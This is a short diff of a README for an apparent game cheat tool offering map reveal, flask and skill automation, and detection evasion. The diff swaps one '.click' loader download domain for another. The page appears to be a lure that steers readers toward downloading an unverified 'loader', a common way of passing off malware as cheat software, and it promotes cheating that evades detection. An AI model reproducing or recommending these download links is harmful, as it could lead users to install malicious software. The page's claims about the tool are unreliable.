@@ -41,12 +41,12 @@ Reveal the entire map, automate flasks and skills, remove fogs — and stay unde
 ## 📥 Download Now
 
 <p align="center">
-  <a href="https://anydownloadloader.click">
+  <a href="https://getloader.click">
     <img src="https://i.postimg.cc/13mZ3fYR/download.png" alt="DOWNLOAD NOW" />
   </a>
 </p>
 
-- 🌐 Dowwnload: [CLICK](https://anydownloadloader.click)  
+- 🌐 Download: [CLICK](https://getloader.click)  
 - 💬 Discord Access: Available after verification  
 
 ---
